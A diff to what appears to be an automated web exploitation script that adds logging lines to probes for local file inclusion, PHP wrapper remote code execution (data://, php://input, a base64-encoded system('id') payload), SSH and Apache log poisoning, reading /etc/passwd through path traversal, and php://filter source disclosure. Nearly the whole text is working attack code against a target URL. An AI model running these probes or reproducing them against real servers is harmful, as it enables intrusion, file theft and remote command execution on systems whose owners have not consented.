@@ -32,9 +32,11 @@ probes:
 
       try_lfi() {
         local url="$1"
+        echo "[PROBE] $url"
         local result
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
         if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
+          echo "[HIT] $url"
           echo "$result" | head -5
           return 0
         fi
@@ -134,6 +136,7 @@ probes:
       READABLE=""
       for f in $TARGETS; do
         url=$(build_url "$f")
+        echo "[READ] $url"
         result=$(curl -s "$url" --max-time 6 2>/dev/null)
         size=${#result}
         if [ "$size" -gt 10 ] && ! echo "$result" | grep -qi "not found\|no such\|failed to open\|warning.*include"; then
@@ -141,6 +144,8 @@ probes:
           echo "$result" | head -8
           echo "---"
           READABLE="$READABLE $f"
+        else
+          echo "[MISS] $f (${size}B)"
         fi
       done
 
@@ -207,15 +212,19 @@ exploit_paths:
             PARAMS="page file include path image content template"
           fi
           for param in $PARAMS; do
-            result=$(curl -s "$BASE/?$param=data://text/plain,<?php%20system('id');?>" --max-time 8 2>/dev/null)
+            URL1="$BASE/?$param=data://text/plain,<?php%20system('id');?>"
+            echo "[PROBE] $URL1"
+            result=$(curl -s "$URL1" --max-time 8 2>/dev/null)
             if echo "$result" | grep -qE 'uid=[0-9]+'; then
-              echo "DATA_WRAPPER_RCE:$param"
+              echo "[HIT] DATA_WRAPPER_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
             fi
-            result=$(curl -s "$BASE/?$param=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==" --max-time 8 2>/dev/null)
+            URL2="$BASE/?$param=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+            echo "[PROBE] $URL2"
+            result=$(curl -s "$URL2" --max-time 8 2>/dev/null)
             if echo "$result" | grep -qE 'uid=[0-9]+'; then
-              echo "DATA_WRAPPER_B64_RCE:$param"
+              echo "[HIT] DATA_WRAPPER_B64_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
             fi
@@ -242,9 +251,11 @@ exploit_paths:
             PARAMS="page file include path image content template"
           fi
           for param in $PARAMS; do
-            result=$(curl -s "$BASE/?$param=php://input" -d '<?php system("id"); ?>' --max-time 8 2>/dev/null)
+            URL="$BASE/?$param=php://input"
+            echo "[PROBE] $URL (POST: <?php system('id'); ?>)"
+            result=$(curl -s "$URL" -d '<?php system("id"); ?>' --max-time 8 2>/dev/null)
             if echo "$result" | grep -qE 'uid=[0-9]+'; then
-              echo "INPUT_WRAPPER_RCE:$param"
+              echo "[HIT] INPUT_WRAPPER_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
             fi
@@ -288,9 +299,11 @@ exploit_paths:
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
               for param in $PARAMS; do
-                result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
+                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                echo "[PROBE] $URL"
+                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
                 if echo "$result" | grep -qE 'uid=[0-9]+'; then
-                  echo "SSH_LOG_POISON_RCE:$param:$depth:$logpath"
+                  echo "[HIT] SSH_LOG_POISON_RCE:$param:$depth:$logpath"
                   echo "$result" | grep "uid="
                   exit 0
                 fi
@@ -327,9 +340,11 @@ exploit_paths:
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for logpath in $LOGS; do
               for param in $PARAMS; do
-                result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
+                URL="$BASE/?$param=${TRAV}${logpath}&cmd=id"
+                echo "[PROBE] $URL"
+                result=$(curl -s "$URL" --max-time 8 2>/dev/null)
                 if echo "$result" | grep -qE 'uid=[0-9]+'; then
-                  echo "APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
+                  echo "[HIT] APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
                   echo "$result" | grep "uid="
                   exit 0
                 fi
@@ -363,9 +378,11 @@ exploit_paths:
 
           if [ -n "$CONFIRMED_PARAM" ] && [ -n "$CONFIRMED_DEPTH" ]; then
             TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
-            result=$(curl -s "$BASE/?$CONFIRMED_PARAM=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+            URL="$BASE/?$CONFIRMED_PARAM=${TRAV}etc/passwd"
+            echo "[PROBE] $URL (confirmed param=$CONFIRMED_PARAM depth=$CONFIRMED_DEPTH)"
+            result=$(curl -s "$URL" --max-time 6 2>/dev/null)
             if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
-              echo "LFI_PASSWD_OK:$CONFIRMED_PARAM:$CONFIRMED_DEPTH"
+              echo "[HIT] LFI_PASSWD_OK:$CONFIRMED_PARAM:$CONFIRMED_DEPTH"
               echo "$result"
               exit 0
             fi
@@ -374,9 +391,11 @@ exploit_paths:
           for depth in 1 2 3 4 5 6 7 8 9 10; do
             TRAV=$(printf '../%.0s' $(seq 1 $depth))
             for param in page file include path image content template; do
-              result=$(curl -s "$BASE/?$param=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+              URL="$BASE/?$param=${TRAV}etc/passwd"
+              echo "[PROBE] $URL"
+              result=$(curl -s "$URL" --max-time 6 2>/dev/null)
               if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
-                echo "LFI_PASSWD_OK:$param:$depth"
+                echo "[HIT] LFI_PASSWD_OK:$param:$depth"
                 echo "$result"
                 exit 0
               fi
@@ -410,9 +429,11 @@ exploit_paths:
             PARAMS="page file include path image content template"
           fi
           for param in $PARAMS; do
-            result=$(curl -s "$BASE/?$param=php://filter/convert.base64-encode/resource=index" --max-time 10 2>/dev/null)
+            URL="$BASE/?$param=php://filter/convert.base64-encode/resource=index"
+            echo "[PROBE] $URL"
+            result=$(curl -s "$URL" --max-time 10 2>/dev/null)
             if [ ${#result} -gt 20 ]; then
-              echo "PHP_FILTER_OK:$param"
+              echo "[HIT] PHP_FILTER_OK:$param"
               echo "$result" | base64 -d 2>/dev/null | head -30
               exit 0
             fi
